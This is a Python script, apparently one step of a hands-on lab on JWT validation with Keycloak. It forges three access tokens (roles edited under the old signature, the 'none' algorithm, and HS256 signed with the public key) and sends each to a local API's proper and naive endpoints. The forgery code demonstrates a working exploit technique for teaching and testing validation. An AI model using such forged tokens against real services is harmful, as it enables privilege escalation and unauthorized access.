"""Step C4: three forged tokens against the real check and the naive one.

1. bob's real token with "orders.write" added to his roles (the signature no longer matches)
2. the same claims with alg "none" and no signature at all (RFC 8725 section 2.1)
3. alg HS256, "signed" with Keycloak's PUBLIC key as if it were a shared secret (key confusion)
"""
import base64
import hashlib
import hmac
import json

import httpx

from oidc import ISSUER, b64url, login, parts

API = "http://api:8000"


def encode(header: dict, claims: dict) -> str:
    return b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + b64url(json.dumps(claims, separators=(",", ":")).encode())


real = login("bob")
header, claims = parts(real)
claims["realm_access"]["roles"].append("orders.write")
signature = real.rsplit(".", 1)[1]

edited = encode(header, claims) + "." + signature
none = encode({**header, "alg": "none"}, claims) + "."
# Key confusion: fetch the public key (anyone can) and use its bytes as an HMAC secret.
jwk = next(k for k in httpx.get(f"{ISSUER}/protocol/openid-connect/certs").json()["keys"] if k["kid"] == header["kid"])
public_pem = ("-----BEGIN CERTIFICATE-----\n" + jwk["x5c"][0] + "\n-----END CERTIFICATE-----\n").encode()
unsigned = encode({**header, "alg": "HS256"}, claims)
hs256 = unsigned + "." + b64url(hmac.new(public_pem, unsigned.encode(), hashlib.sha256).digest())

for label, token in [("1. edited roles, old signature", edited), ("2. alg none, no signature", none),
                     ("3. HS256 with the public key", hs256)]:
    real_check = httpx.post(f"{API}/orders", headers={"Authorization": f"Bearer {token}"})
    naive_check = httpx.get(f"{API}/naive/orders", headers={"Authorization": f"Bearer {token}"})
    print(label)
    print(f"   POST /orders        {real_check.status_code}  {real_check.json()['detail']}")
    print(f"   GET  /naive/orders  {naive_check.status_code}  {naive_check.json()}")
